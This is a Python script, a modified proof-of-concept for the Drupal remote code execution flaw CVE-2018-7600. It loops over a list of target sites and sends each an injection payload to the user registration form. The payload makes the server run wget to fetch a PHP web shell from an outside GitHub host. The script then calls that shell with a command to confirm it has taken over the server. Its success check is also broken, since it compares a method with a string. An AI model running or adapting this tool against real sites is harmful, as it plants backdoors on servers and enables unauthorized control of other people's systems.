#!/usr/bin/env
import sys
import requests
import os
import urllib3

def mrun():
    
    try:
        
        with open("Site_List.txt") as f:
                for line in f:
                        target = str(line).rstrip()
                        url = target + "user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
                        payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'wget  https://raw.githubusercontent.com/3skiy4/Exploits/master/3skiy4.php'}

                        r = requests.post(url, data=payload,verify=False)

                        url2= target +"3skiy4.php?run=echo \"fuck\""

                        r2 = requests.get(url2,verify=False)
                        print url2

                        if r2.status_code == 200 and r2.text.find !="fuck":
                                        print ("[-_-]You'r http status code is 200 but you get Access Denid Page or 404 page ")
                        elif r.status_code == 200 and r2.text.find =="fuck":
                                           
                                print("==========================================")
                                print ('\n [-_+]Check: '+target+'3skiy4.php')
                                print("==========================================")
    except KeyboardInterrupt:
        print("------------------------------------")
        print '[:)]Key Interrupted By BY.. '
        try:
            sys.exit(0)
            
        except SystemExit:
            os._exit(0)
                


if __name__ == '__main__':
    
    try:
        print ('################################################################')
        print ('# Proof-Of-Concept for CVE-2018-7600')
        print ('# by Vitalii Rudnykh')
        print ('# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders')
        print ('# https://github.com/a2u/CVE-2018-7600')
        print ('# Modify\'ed by 3skiy4')
        print ('################################################################')
        print ('Provided only for educational or information purposes\n')
        mrun()
        
    except :
        pass
